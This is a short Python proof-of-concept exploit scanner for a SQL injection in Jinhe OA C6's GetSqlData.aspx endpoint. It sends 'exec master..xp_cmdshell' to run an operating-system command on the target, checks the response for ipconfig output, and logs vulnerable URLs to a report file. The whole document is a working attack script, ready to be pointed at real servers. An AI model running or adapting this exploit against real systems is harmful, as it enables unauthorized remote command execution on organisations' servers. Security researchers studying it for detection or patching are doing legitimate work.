import requests
import time

import buter

filename = "./reps/金和OAC6_GetSgIDataQL注入导致RCE-"+str(time.strftime("%Y-%m-%d", time.localtime()))
poc ='/C6/Control/GetSqlData.aspx/.ashx'
data = "exec master..xp_cmdshell 'ipconfig'"

headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

def jhoac6gsiRCE(url):
    try:
        rep = requests.get(url=url+poc,data=data,headers=headers, verify=False,timeout=3)
        if rep.status_code ==200 and 'IPv' in rep.text:
            print(buter.colors.GREEN + f"存在金和OA C6-GetSgIData.aspx SQL注入漏洞会导致RCE url : {url}" + buter.colors.END)
            print(buter.colors.END+ f"输出 : {rep.text}"+buter.colors.END)
            f = open(filename, "a+", encoding="utf-8")
            f.write(rep.url)
            f.write("\n")
            f.close()
        else:
            print(buter.colors.RED +  f"未发现金和OAC6_GetSgIDataQL注入漏洞 url : {url}" + buter.colors.END)
    except Exception as e:
        print(f"ERROR : {e}")
